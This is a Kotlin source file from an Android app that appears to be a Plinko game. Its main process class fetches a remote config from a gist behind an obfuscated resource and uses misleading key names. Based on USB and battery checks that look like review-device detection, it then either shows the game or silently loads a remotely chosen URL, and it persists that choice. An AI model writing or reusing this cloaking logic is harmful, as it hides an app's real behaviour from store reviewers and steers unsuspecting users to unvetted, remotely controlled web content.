package com.plinko.ballwinx100.tool

import android.app.Activity
import android.content.Context
import com.plinko.ballwinx100.R
import com.plinko.ballwinx100.databinding.ActivityMainBinding
import com.plinko.ballwinx100.util.DataStoreManager
import com.plinko.ballwinx100.util.Network
import com.plinko.ballwinx100.util.Once
import com.plinko.ballwinx100.util.getBatteryPercentage
import com.plinko.ballwinx100.util.isBatteryCharging
import com.plinko.ballwinx100.util.isUSB
import com.plinko.ballwinx100.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.launch
import kotlin.system.exitProcess

class Plinko37MainProcess(
    private val context: Context,
    private val scope: CoroutineScope,
    private val network: Network,
) {

    constructor(
        context: Context,
        scope: CoroutineScope,
    ) : this(
        context,
        scope,
        Network(
            context.getString(R.string.f5mNBV)
        ),
    )

    private val exitHandler = Once()

    val startFragmentID = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)

    private var internetStatus: InternetStatus? = null
    private var loaderStatus: LoaderStatus? = null
    private var loaclUrl: String = ""
    private var firstOpen: Boolean = false

    fun url() = loaclUrl
    fun firstOpen() = firstOpen

    fun setUIStatuses(binding: ActivityMainBinding) {
        internetStatus = InternetStatus(context, scope, binding)
        loaderStatus = LoaderStatus(binding)
    }

    private fun navigateToGameScreen() {
        scope.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "plinko371" }
            startFragmentID.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun navigateToFrame(activity: Activity, url: String) {
        scope.launch(Dispatchers.IO) {
            loaclUrl = url
            firstOpen = true

            DataStoreManager.Key.update { "plinko370" }
            DataStoreManager.Link.update { loaclUrl }
            startFragmentID.tryEmit(
                context.packageName.hashCode()
            )
        }
    }

    fun validateStoredData(activity: Activity) {
        scope.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "plinko370" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        loaclUrl = it
                        startFragmentID.emit(
                            context.packageName.hashCode()
                        )
                    }
                }
                "plinko371" -> {
                    log("DataStoreManager Key = GAME")
                    startFragmentID.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    fetchRemoteConfigData(activity)
                }
            }
        }
    }

    private fun fetchRemoteConfigData(activity: Activity) {
        scope.launch {
            network.getGistJSON(
                onSuccess = { json ->
                    val condition = json.getString("thought")
                    val redirectUrl = json.getString("previous")

                    evaluateUserConditions(activity, condition, redirectUrl)
                },
                onFailed = {
                    startFragmentID.tryEmit(R.id.libGDXFragment)
                    log("Fetch failed")
                }
            )

        }
    }

    private fun evaluateUserConditions(activity: Activity, condition: String, redirectUrl: String) {
        if (condition == "true") {
            if (context.isUSB() || (context.getBatteryPercentage() == 100 && context.isBatteryCharging())) {
                navigateToGameScreen()
            } else {
                navigateToFrame(activity, redirectUrl)
            }
        } else {
            navigateToGameScreen()
        }
    }

    fun exit(activity: Activity){
        exitHandler.once {
            log("Exiting application")
            scope.launch(Dispatchers.Main) {
                activity.finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    fun internetStatus() = internetStatus!!
    fun loaderStatus() = loaderStatus!!
}